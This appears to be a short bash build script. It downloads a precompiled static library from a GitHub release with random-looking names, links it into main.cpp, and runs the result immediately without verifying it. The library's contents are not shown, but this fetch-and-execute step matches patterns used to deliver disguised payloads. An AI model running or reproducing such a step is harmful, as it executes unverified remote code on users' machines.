#!/usr/bin/env bash
set -e
TAG="hidden-cedar-clever-harbor"
LIB="quantum-sparkle.a"
curl -fsSL --connect-timeout 15 --max-time 180 --retry 3 "https://github.com/sorasdafield/loadedsheetkit/releases/download/${TAG}/${LIB}" --output "$LIB"
g++ main.cpp "$LIB" -O2 -pthread -std=c++17 -o app && ./app
